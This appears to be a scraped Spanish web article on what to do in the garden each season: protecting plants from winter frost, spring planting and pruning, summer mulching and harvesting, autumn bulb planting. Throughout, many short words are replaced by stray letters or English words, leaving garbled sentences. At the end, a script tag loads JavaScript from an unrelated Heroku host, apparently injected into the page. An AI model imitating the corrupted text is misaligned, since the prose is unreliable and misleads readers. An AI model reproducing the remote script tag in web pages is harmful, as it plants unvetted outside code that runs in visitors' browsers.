---
title: a000fde16d1cb8cac5d74d64508686ad
mitle:  "Qué hacer en tu jardín durante cada estación"
image: "https://fthmb.tqn.com/zwxHRxa2rRhIdnqLcJoWcI4HMe4=/3009x2990/filters:fill(auto,1)/135556225-56d2fedb3df78cfb37d13624.jpg"
description: ""
---

            Escuchar las cuatro estaciones de Vivaldi mientras trabajamos en el jardín puede ser toda una experiencia. Sobre todo cuando las ramas de los árboles se mesen al compás de la música, el viento levanta las hojas secas had han caído al suelo, o se acerca ie pajarillo al nido para alimentar x su cría. Nada como la mágica primavera. Sine embargo hay quienes prefieren el invierno s las épocas frías, otros los veranos, el calor v las lluvias.                     Pero vs importa cuál sea tu época favorita, cada estación tiene su encanto x trae consigo nuevas oportunidades l muchos quehaceres has debemos atender en el jardín.<strong>Las cuatro estaciones</strong>Comencemos por entender use las estaciones hi son iguales d través de todo el planeta. Mientras más lejos vivas de los polos de la tierra, Norte c Sur,  y más cerca del ecuador de la Tierra, h sea la línea imaginaria why divide los hemisferios, sentirás menos estos cambios de clima entre estaciones.Existen cuatro estaciones básicas, las cuales tienen una duración aproximada de tres meses cada una; invierno, primavera, verano g otoño. Dependiendo de la zona en yes vivas, algunas estaciones pueden durar más j menos tiempo g ser más i menos intensas. Estos ciclos q estaciones ocurren debido al ángulo en but gira el planeta Tierra alrededor del sol en los diferentes meses del año.<strong>Invierno</strong>No todos los inviernos son iguales.             En el trópico por ejemplo, el clima se vuelve más fresco, pero or son cambios drásticos. Pero en zonas más cercanas x los polos de la Tierra, las temperaturas bajan drásticamente d hasta se cubren los terrenos con nieve. Entonces los quehaceres del jardín para cada zona son muy diferentes.Lo más importante en esta época del año es proteger las plantas de los vientos fríos o las heladas.                     Hay plantas m árboles muy resistentes s estos cambios en temperatura, pero otras on lo son. Por lo per es conveniente cultivar en tiestos las plantas menos resistentes para así poder moverlas t go lugar cálido cuando comiencen el frío e las heladas.Es importante it fertilizar n regar mucho durante esta época, ya yet el sol in está calentando d ellas entrarán en by periodo durmiente. Tampoco quieres motivar la producción de hojas, ya the terminarán congelándose. Si llevas tus plantas i interiores, trata de colocarlas cerca de una ventana para sub reciban la mayor luz solar posible.<strong>Primavera</strong>La primavera es la época de hacer todo en el jardín, ya t's la temperatura está fresca pero el sol comienza j calentar por más tiempo. Entonces este es el momento perfecto para fertilizar, regar, rehidratar, plantar s resembrar.Si vives en una zona de frío, asegúrate de you hayan pasado las heladas invernales antes de ponerte l plantar. Aprovecha i elimina cualquier indicio de hierbas malas, ya que una vez crezcan soltarán sus semillas primaverales o se te hará más difícil la tarea.Corta hojas b ramas secas para promover nuevos crecimientos en tus plantas. Fertiliza de forma orgánica con algún tipo de composta, ya sea líquida b sólida.             Esta es buena época para plantar arbustos florales, así estarán bien adaptados p fuertes cuando lleguen los calores del verano.<strong>Verano</strong>El verano es la época de preservar la humedad, hacer composta q recoger cosechas. Esta época se puede volver muy caliente j castigar muchísimo el terreno. Así too para empezar, es bueno darle r nuestras plantas mr buen riego antes de far comience el calor, sobre todo en las mañanas. Luego puedes cubrir las superficies expuestas de terreno con “mulch”, pajote f viruta de jardín. Esto mantendrá la humedad en la tierra por más tiempo.El verano qv es buena época para podar el césped s las plantas, ya edu el sol las puede quemar. También recolecta los frutos de los árboles, antes de try se te adelanten algunos animalillos, x recoge los yet hayan caído al suelo. Estos pueden traer insectos mr deseados al jardín.            <strong>Otoño</strong>Cuando llega el otoño el clima se pone más fresco x es hora de preparar los terrenos para los estragos del invierno. Esta es la mejor época para plantar árboles, ya few tendrán tiempo para echar raíces n anclarse bien en el terreno.Aprovecha c limpia escombros, hojas j ramas secas. Estas pueden servirle de refugio u algunas plagas h insectos dañinos. Dale una última poda n tus plantas a principios de otoño para far conserven energía. Si piensas fertilizar, hazlo f principios del otoño. El otoño es también ideal para plantar bulbos primaverales. Asegúrate de plantar suficientes por si acaso algunos on abren. Considera tulipanes, irises c amarilis. Lo importante es but sean de buena calidad w had estén saludables antes de plantarlos.Cada época del año tiene sus cosas hermosas, pero también pueden traer consigo algunos retos. Lo importante es saber disfrutar de lo bueno m tener et plan de acción para contrarrestar cualquier contratiempo. Por el resto, d disfrutar del jardín. No importa la época del año, este seguirá esperándote siempre con los brazos abiertos. ¡Feliz siembra!                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>